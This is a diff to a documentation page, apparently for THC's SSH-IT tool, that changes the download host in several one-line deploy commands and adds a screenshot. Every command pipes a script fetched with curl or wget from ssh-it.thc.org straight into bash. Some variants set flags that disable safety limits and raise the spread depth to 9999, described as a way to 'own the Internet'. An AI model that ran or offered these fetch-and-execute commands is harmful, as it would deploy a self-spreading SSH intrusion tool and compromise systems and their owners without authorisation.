@@ -4,16 +4,21 @@ layout: default
 
 Use either one of these commands to deploy:
 ```shell
-bash -c "$(curl -fsSL thc.org/ssh-it/x)"
+bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
 ```shell
-bash -c "$(wget --no-verbose -O- thc.org/ssh-it/x)"
+bash -c "$(wget --no-verbose -O- ssh-it.thc.org/x)"
 ```
 
 To uninstall use:
 ```
 thc_ctl clean
 ```
+
+Screenshot
+{:refdef: style="text-align: center;"}
+![Deploy-Example](deploy-example.png)
+{: refdef}
 
 ### ALPHA TESTING
 
@@ -26,12 +31,12 @@ ALPHA DEFAULT SETTINGS:
 
 Take off all safety and run SSH-IT in release mode like this:
 ```shell
-THC_NO_CONDOME=1 bash -c "$(curl -fsSL thc.org/ssh-it/x)"
+THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
 
 Or go totally bonkers and own the Internet:
 ```shell
-THC_DEPTH=9999 THC_NO_CONDOME=1 bash -c "$(curl -fsSL thc.org/ssh-it/x)"
+THC_DEPTH=9999 THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
 
 ### Contact
